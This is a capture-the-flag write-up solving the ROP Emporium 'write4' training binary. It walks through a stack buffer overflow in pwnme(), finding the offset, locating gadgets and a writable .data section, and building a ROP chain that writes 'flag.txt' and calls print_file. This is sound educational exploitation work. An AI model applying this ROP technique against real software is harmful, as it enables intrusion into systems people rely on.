# [write4](https://ropemporium.com/challenge/write4.html)

Let's test the program :

```console
$ ./write4 
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> test
Thank you!
```

## Static Analysis

Using Ghidra we can find those functions inside write4 :

```C
undefined8 main(void)
{
  pwnme();
  return 0;
}

void usefulFunction(void)
{
  print_file("nonexistent");
  return;
}
```

And those functions inside libwrite4.so :

```C
void pwnme(void)
{
  undefined local_28 [32];
  
  setvbuf(_stdout,(char *)0,2,0);
  puts("write4 by ROP Emporium");
  puts("x86_64\n");
  memset(local_28,0,32);
  puts("Go ahead and give me the input already!\n");
  printf("> ");
  read(0,local_28,512);
  puts("Thank you!");
  return;
}

void print_file(char *param_1)
{
  char local_38 [40];
  FILE *local_10;
  
  local_10 = (FILE *)0x0;
  local_10 = fopen(param_1,"r");
  if (local_10 == (FILE *)0x0) {
    printf("Failed to open file: %s\n",param_1);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_38,33,local_10);
  puts(local_38);
  fclose(local_10);
  return;
}
```

The `read()` function inside `pwnme()` expects 512 bytes even tho the `local_28` variable is 32 bytes long. This is vulnerable to a buffer overflow.  
  
We need to exploit this vulnerability to redirect the program towards the `print_file()` function with `flag.txt` as argument.

## Dynamic analysis

Let's use gdb to find out what offset we need to access the return pointer :

```gdb
gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
```

```gdb
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda10│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
0x00007fffffffda18│+0x0008: 0x4141414141414141
0x00007fffffffda20│+0x0010: 0x4141414141414141
0x00007fffffffda28│+0x0018: 0x4141414141414141
0x00007fffffffda30│+0x0020: 0x00007fffffffda0a  →  0x414100007ffff7c0	 ← $rbp
0x00007fffffffda38│+0x0028: 0x0000000000400610  →  <main+0009> mov eax, 0x0
0x00007fffffffda40│+0x0030: 0x0000000000000001
0x00007fffffffda48│+0x0038: 0x00007ffff7a456ca  →  <__libc_start_call_main+007a> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7c00927 <pwnme+007d>     mov    rsi, rax
   0x7ffff7c0092a <pwnme+0080>     mov    edi, 0x0
   0x7ffff7c0092f <pwnme+0085>     call   0x7ffff7c00770 <read@plt>
 → 0x7ffff7c00934 <pwnme+008a>     lea    rdi, [rip+0xf1]        # 0x7ffff7c00a2c
   0x7ffff7c0093b <pwnme+0091>     call   0x7ffff7c00730 <puts@plt>
   0x7ffff7c00940 <pwnme+0096>     nop    
   0x7ffff7c00941 <pwnme+0097>     leave  
   0x7ffff7c00942 <pwnme+0098>     ret    
   0x7ffff7c00943 <print_file+0000> push   rbp
```

The rbp is stored right after our input on the stack. Now let's find a pointer to the PLT address of the function print_file() we need to call :

```gdb
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:	push   rbp
   0x0000000000400618 <+1>:	mov    rbp,rsp
   0x000000000040061b <+4>:	mov    edi,0x4006b4
   0x0000000000400620 <+9>:	call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:	nop
   0x0000000000400626 <+15>:	pop    rbp
   0x0000000000400627 <+16>:	ret
End of assembler dump.
gef➤  x/3i 0x400510
   0x400510 <print_file@plt>:	jmp    QWORD PTR [rip+0x200b0a]        # 0x601020 <print_file@got.plt>
   0x400516 <print_file@plt+6>:	push   0x1
   0x40051b <print_file@plt+11>:	jmp    0x4004f0
```

Other method :

```console
$ rabin2 -i write4  
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400500 GLOBAL FUNC       pwnme
2   0x00000000 GLOBAL FUNC       __libc_start_main
3   0x00000000 WEAK   NOTYPE     __gmon_start__
4   0x00400510 GLOBAL FUNC       print_file
```

Now we need to find a way to write the string `flag.txt` somewhere in memory. Let's take a look at the sections of our binary :

```console
$ rabin2 -S write4                                               
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- .shstrtab
```

Let's use the data section on which we can both read and write : `23  0x00001028   0x10 0x00601028   0x10 -rw- .data`.

Now we'll need to find some gadget to write over memory :

```console
$ ROPgadget --binary write4 | grep 'mov qword'
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
```

To use this gadget we need another one to modify r14 and r15 :

```console
$ ROPgadget --binary write4 | grep 'r14'             
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

This gadget does exactly that : `0x0000000000400690 : pop r14 ; pop r15 ; ret`.  
  
Lastly we need to modify rdi to point towards our string `flag.txt`, since rdi stores the pointer towards the first argument of a called function. Let's find a gadget to do so :

```console
$ ROPgadget --binary write4 | grep 'rdi'
0x0000000000400693 : pop rdi ; ret
```

We've got all we need. Our payload will be : some offset to reach the return pointer, the gadgets to modify r14 and r15, the gadgets to modify rdi, and finally a pointer towards the PLT entry for the print_file() function.

## Exploit

Using [this script](./exploit.py) we get the flag :

```console
$ python3 exploit.py
[*] '/home/coucou/Documents/ROP_Emporium/04_write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/coucou/Documents/ROP_Emporium/04_write4/write4': pid 22744
[*] Switching to interactive mode
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```
